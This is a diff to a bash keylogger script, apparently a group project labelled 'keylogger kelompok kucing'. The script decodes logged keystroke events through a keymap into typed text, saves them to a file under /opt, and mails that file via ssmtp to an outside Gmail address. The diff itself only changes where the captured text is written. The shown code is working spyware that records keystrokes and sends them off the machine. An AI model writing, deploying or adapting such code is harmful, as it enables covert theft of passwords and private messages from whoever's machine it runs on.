@@ -3,7 +3,7 @@
 FOLDER="kelompokkucing"
 LOGGER="/opt/$FOLDER/logger.txt"
 KEYMAPS="/opt/$FOLDER/keymaps.txt"
-OUTPUT="/opt/$FOLDER/history/hist_$(date +'%F_%H-%M-%S').txt"
+# OUTPUT="/opt/$FOLDER/history/hist_$(date +'%F_%H-%M-%S').txt"
 
 
 ##################################### record log in array
@@ -108,7 +108,7 @@ done
 cc=''
 len=0
 caps="off"
-echo $(date +'%F_%H-%M-%S') > $OUTPUT
+echo $(date +'%F_%H-%M-%S') > /opt/kelompokkucing/output.txt
 for (( aa=0;aa<${#arr[@]};aa+=2));do
   # echo ${arr[@]:aa:1} - ${arr[@]:aa+1:1}
   for (( bb=0;bb<${#keymap[@]};bb+=3));do
@@ -119,7 +119,7 @@ for (( aa=0;aa<${#arr[@]};aa+=2));do
         if [ ${arr[@]:aa:1} -eq 28 ] #return or enter button
         then
           cc+="(${keymap[@]:bb+2:1})" 
-          echo $cc >> $OUTPUT
+          echo $cc >> /opt/kelompokkucing/output.txt
           cc=''
         else   
           if [ ${arr[@]:aa:1} -eq 42 ] #shift button
@@ -161,14 +161,14 @@ for (( aa=0;aa<${#arr[@]};aa+=2));do
     fi
   done
 done
-echo $cc >> $OUTPUT
+echo $cc >> /opt/kelompokkucing/output.txt
 # echo "###########"
-# cat $OUTPUT.txt 
+# cat $/opt/kelompokkucing/OUTPUT.txt 
 
 #####################kirim email
 RECIEVER="luckyrama0@gmail.com"
 SUBJECT="Subject: keylogger kelompok kucing"
 MAIL="/opt/$FOLDER/mail.txt"
 echo $SUBJECT > $MAIL
-cat $OUTPUT >> $MAIL
+cat /opt/kelompokkucing/output.txt >> $MAIL
 ssmtp $RECIEVER < $MAIL
